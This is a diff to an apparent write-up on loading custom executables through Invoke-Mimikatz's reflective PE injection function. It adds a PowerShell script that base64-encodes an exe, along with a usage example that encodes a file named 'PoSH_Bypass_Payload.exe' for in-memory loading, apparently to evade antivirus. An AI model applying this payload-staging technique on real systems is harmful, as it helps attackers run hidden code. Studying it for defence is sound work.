@@ -57,6 +57,28 @@ If we look inside the Invoke-Mimikatz script the authors notes at around line 56
 So to achieve a similar outcome with an executable of your making the process would be essentially just encode your exe and store in  $PEBytes and call the Invoke-ReflectivePEInjection function.
 
 I've added a couple of scripts to give a proof of concept, the first script Convert-ExeToString.ps1, will take the path of the exe payload you want to encode, its output will be a base64 encoded string of the exe bytes.
+
+```powershell
+<#
+A dirty script to take the path to an .exe read all the bytes and base64 encode.
+#>
+
+function Convert-ExeToString {
+ 
+   [CmdletBinding()] param (
+ 
+      [string] $File
+   )
+  $ByteArray = [System.IO.File]::ReadAllBytes($File);
+  if ($ByteArray) {
+      $Base64String = [System.Convert]::ToBase64String($ByteArray);
+   }
+   Write-Output -InputObject $Base64String;
+}
+```
+
+
+
 ```powershell
 Import-Module .\Convert-ExeToString.ps1
 Convert-ExeToString -File ~/Desktop\PoSH_Bypass_Payload.exe
